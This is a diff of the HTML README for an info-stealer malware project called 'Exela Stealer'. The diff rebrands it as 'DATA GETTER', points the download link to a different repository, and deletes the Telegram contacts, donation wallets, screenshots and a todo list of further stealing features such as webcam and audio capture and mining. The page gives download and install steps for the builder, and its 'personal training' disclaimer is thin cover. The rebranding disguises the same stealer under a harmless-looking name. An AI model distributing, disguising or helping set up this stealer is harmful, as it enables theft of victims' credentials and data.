@@ -6,9 +6,7 @@
 <head>
 
 <!-- Content -->
-<h1 id="exela-stealer">Exela Stealer</h1>
-<p>Exela Stealer, a powerful and feature-rich tool, offers the following functionalities:<br>
-   <a href="https://t.me/ExelaStealer">Telegram Adress</a> - Join our Telegram channel for the latest developments
+<h1 id="exela-stealer">DATA GETTER</h1>
 </p>
 
 <!-- Features Section -->
@@ -21,8 +19,6 @@
   <li><a href="#builder-settings">Builder Settings</a></li>
   <li><a href="#how-to-build">How to Build</a></li>
   <li><a href="#disclaimer">Disclaimer</a></li>
-  <li><a href="#support-the-project">Support the Project</a></li>
-  <li><a href="#screenshots">Screenshots</a></li>
 </ul>
 
 <h2 id="features">Features 🚀</h2>
@@ -73,18 +69,14 @@
 
 <!-- How to Build Section -->
 <h2 id="how-to-build">How to Build 🛠️</h2>
-<p>To set up Exela Stealer, follow these steps:</p>
+<p>To set up DataGetter, follow these steps:</p>
 <ol>
   <li>:arrow_down: Download and Install <a href="https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe">python 3.11.0</a></li>
-  <li>:arrow_down: <a href="https://github.com/quicaxd/Exela-V2.0/archive/refs/heads/main.zip">Download Exela Stealer</a></li>
-  <li>:arrow_down: <a href="https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file">Extract</a> the zip file.</li>
+  <li>:arrow_down: <a href="https://github.com/LorenzHPP/DataGetter/archive/refs/heads/main.zip">Download DataGetter</a></li>
+  <li>:arrow_down: <a > Extract</a> the zip file.</li>
   <li>:point_right: Navigate to the Exela Stealer folder and double click <code>install.bat</code>.</li>
   <li>:rocket: Follow the on-screen instructions to complete the setup.</li>
 </ol>
-
-<!-- Todo Section -->
-<h2 id="todo">Todo 📝</h2>
-<p>- Yandex Stealer<br>- Take Webcamshot<br>- Record Audio<br>- Mining<br>- Youtube Session stealer & validator</p>
 
 <!-- Additional Section -->
 <h2 id="additional">Additional ℹ️</h2>
@@ -93,36 +85,3 @@
 <!-- Disclaimer Section -->
 <h2 id="disclaimer">Disclaimer ⚠️</h2>
 <p>- This software was developed for personal training and sandbox testing. The developer of the software is not responsible in any way for its misuse. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.</p>
-
-<!-- Notes Section -->
-<h2 id="notes">Note's 📢</h2>
-<p>- If you have any issues or need support with this project, you can contact me via <a href="https://t.me/quicaxd">Telegram</a>:speech_balloon:</p>
-
-<!-- Support the Project Section -->
-<h2 id="support-the-project">Support the Project</h2>
-<p>If you find this project useful and would like to show your support, you can make a donation using the following cryptocurrencies:</p>
-<ul>
-  <li><strong>Bitcoin (BTC):</strong> Wallet Address: bc1qy8r6ck0c5nqcyhgnhvlpc0drjp9c2lergjqy5d</li>
-  <li><strong>Ethereum (ETH):</strong> Wallet Address: 0x6285dCe8F35d7f31FBf41a648CC35212caF690B1</li>
-  <li><strong>USDT (Tron network):</strong> Wallet Address: TGRk3pvcWvoKrXMDATPrVstQHa9c9hqhHQ</li>
-</ul>
-
-<!-- Screenshots Section -->
-<h2 id="screenshots">Screenshots 📸</h2>
-<img src="https://i.hizliresim.com/tlw310u.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/lydcp4j.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/fkrwgnz.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/p6g34k7.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/pwjcr7q.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/rq5f3aq.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/1tgq2pk.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/q7fo0uh.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/6lq5j31.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/74f0h7v.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/hoih3vl.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/d94lzcd.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/bpvju1g.png" alt="Application Screenshot">
-<img src="https://i.hizliresim.com/2t4wk7a.png" alt="Application Screenshot">
-
-</body>
-</html>
